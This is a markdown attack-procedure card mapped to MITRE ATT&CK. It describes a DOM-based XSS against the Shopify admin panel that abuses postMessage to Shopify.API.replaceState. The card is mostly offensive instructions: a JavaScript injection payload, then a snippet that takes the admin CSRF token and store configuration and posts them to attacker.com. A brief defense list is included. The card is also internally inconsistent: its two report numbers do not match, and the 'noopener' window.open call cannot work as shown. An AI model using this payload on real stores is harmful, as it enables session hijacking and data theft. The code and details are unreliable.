---
tags:
  - xss
  - dom-xss
  - shopify
  - postmessage
  - javascript
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:29:36.000Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 779c551a-6277-4568-b1da-43ec14c24e3e
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
---
id: 123e4567-e89b-12d3-a456-426614174001
name: Inject-Malicious-Page-in-Shopify-Admin-via-postMessage-Manipulation
type: procedure
verified: false
submitted: false
created_at: 2023-10-01T00:00:00Z
updated_at: 2023-10-01T00:00:00Z
tactics: [[Initial Access]], [[Execution]], [[Collection]]
techniques: [[Exploit Public-Facing Application]], [[JavaScript]]
sub_techniques: []
tags: xss, dom-xss, shopify, postmessage, javascript
commands: []
platforms: Web
tools: []
---

# Inject-Malicious-Page-in-Shopify-Admin-via-postMessage-Manipulation

## Summary

This procedure exploits a DOM-based Cross-site Scripting (XSS) vulnerability in Shopify's admin panel by crafting a JavaScript payload that opens a new window to the /admin/themes endpoint and uses postMessage to manipulate the Shopify.API.replaceState function, injecting a malicious page. This allows arbitrary JavaScript execution in the context of the active admin session, enabling the extraction of sensitive data such as CSRF tokens and store configurations. The payload bypasses a previous fix from report #868615 by using a novel pathname manipulation technique.

## Description

The attack targets insufficient sanitization of postMessage data in the Shopify.API.replaceState handler within the admin panel. By opening a new window in a blank context to location.origin + '/admin/themes' and sending a postMessage with a crafted JSON payload containing a malicious pathname (e.g., 'abc:d../pages/xss#//'), the attacker tricks the application into replacing the URL state and loading an injected page. This occurs in the browser's DOM without server-side reflection, making it a pure client-side DOM-based XSS. The primary use case is session hijacking in e-commerce admin environments to steal authentication artifacts and configuration details. Prerequisites include an initial XSS vector to execute the payload in the victim's browser while they are authenticated to the admin panel.

## Requirements

1. Victim must have an active authenticated session in the Shopify admin panel
2. Attacker needs a way to inject or execute JavaScript in the victim's browser (e.g., via phishing email or another XSS)
3. Target must be running a vulnerable version of Shopify admin (pre-fix for report #883867)
4. Browser must support window.open and postMessage APIs (modern browsers like Chrome, Firefox)

## Defense

Defensive measures and detection strategies:

- Implement strict origin checks and validation for postMessage events in Shopify.API handlers to prevent unauthorized state changes
- Use Content Security Policy (CSP) with 'sandbox' directives to restrict script execution in iframes or new windows
- Monitor for anomalous postMessage events or unexpected window openings in browser dev tools or via client-side logging
- Apply the patch from Shopify's response to report #883867, which enhances pathname sanitization

## Objectives

1. Inject a malicious page into the Shopify admin context to execute arbitrary JavaScript
2. Abuse the admin session to access and extract sensitive data like CSRF tokens
3. Demonstrate bypass of prior vulnerability fixes for escalated impact

## Instructions

### Step 1: Prepare and Execute the JavaScript Payload

**Context**: This step injects the payload to open a controlled window and send the manipulative postMessage, triggering the DOM-based XSS.

Execute the following JavaScript in the victim's browser console or via an injected script tag:

```javascript
var win = window.open(location.origin + '/admin/themes', '_blank', 'noopener,noreferrer');
var maliciousPath = 'abc:d../pages/xss#//'; // Crafted pathname to bypass sanitization
var data = JSON.stringify({ message: 'Shopify.API.replaceState', pathname: maliciousPath });
win.postMessage(data, '*');
```

> This code opens a new window to the themes page, constructs a JSON payload with the malicious pathname that exploits path traversal-like manipulation, and sends it via postMessage. The '*' targetOrigin is used for broad compatibility but should be restricted in production. Expected output: The window navigates to the injected path, loading the malicious content without errors.

### Step 2: Verify Injection and Extract Data

**Context**: Confirm the injection succeeded and use the injected page to collect sensitive information from the admin session.

In the injected page context (e.g., the /pages/xss endpoint now active), execute additional JavaScript to exfiltrate data:

```javascript
// Example: Extract CSRF token from document or session
var csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;
fetch('https://attacker.com/exfil', { method: 'POST', body: JSON.stringify({csrf: csrfToken, config: window.storeConfig}) });
```

> This scrapes the CSRF token and any exposed store configurations, sending them to an attacker-controlled endpoint. Expected output: Network request to attacker server with stolen data, visible in browser network tab or server logs.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution
- [[Collection]] Collection

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- dom-xss
- shopify
- postmessage
- javascript
